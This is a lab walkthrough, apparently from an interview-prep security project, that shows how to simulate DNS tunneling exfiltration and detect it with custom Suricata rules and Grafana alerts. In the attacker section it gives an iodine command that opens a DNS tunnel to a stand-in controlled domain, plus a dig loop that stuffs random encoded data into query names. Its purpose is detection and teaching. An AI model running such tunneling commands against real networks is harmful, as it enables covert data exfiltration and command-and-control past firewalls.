# Attack 3 — DNS tunneling (the standout attack) 🌟

> ⚠️ Lab only. This is the most impressive detection to demo because most
> candidates have never heard of it — and it maps directly to my DNS-tunnel
> detection research.

## The idea

DNS is almost never blocked by firewalls. Attackers abuse that: they **encode
data inside DNS queries** (long subdomain labels, TXT records) to smuggle data
out or run a covert command-and-control channel. It looks like "normal" DNS, but
the *pattern* is abnormal — and that's exactly what we detect.

## What the attacker does (Kali) — using `iodine`

```bash
# On an authoritative server you control (or dnstt), set up the tunnel endpoint.
# Then from Kali, bring up the tunnel:
sudo iodine -f -P secret t1.tunnel.example.com

# Now traffic is tunneled over DNS. Generate load so the pattern shows:
ping -c 50 10.0.0.1          # over the tunnel interface (dns0)
```

Simple no-infrastructure simulation (if you don't want a full tunnel):

```bash
# Fire many oversized DNS queries to make the detector trigger
for i in $(seq 1 60); do
  dig $(head -c 80 /dev/urandom | base64 | tr -d '/+=' | head -c 70).example.com @10.10.20.100 TXT +short
done
```

## What should happen (defence)

1. Tunnel queries have **very long query names** (data encoded in the label) and
   often use **TXT** records at high volume.
2. Custom rules fire:
   - **SID 1000020** — oversized DNS query name (>60 chars).
   - **SID 1000021** — TXT-query flood.
   - **SID 1000022** — high overall DNS query volume from one internal host.
3. Grafana's alert stream shows the internal host as the source — meaning
   *something inside your network is exfiltrating over DNS.*

## Interview explanation (this wins the room)

- **Layer 7:** DNS is an application-layer protocol. A normal query name is short
  (`mail.google.com`). A tunnel crams base32/base64-encoded data into the label,
  so names get long and entropy gets high.
- **Why it evades firewalls:** UDP/53 is allowed outbound almost everywhere, so a
  simple port-based firewall never sees it. You need to inspect the *content and
  behaviour* of DNS — which is what Suricata + these rules do.
- **My research angle:** beyond thresholds, you can score each query on name
  length, entropy, and query-type mix, then flag anomalies with a model. Mention
  this as the "v2" of the project — it shows depth.
- **Defence in depth:** force all clients to use an internal resolver, log every
  query, and alert on long/high-entropy names.
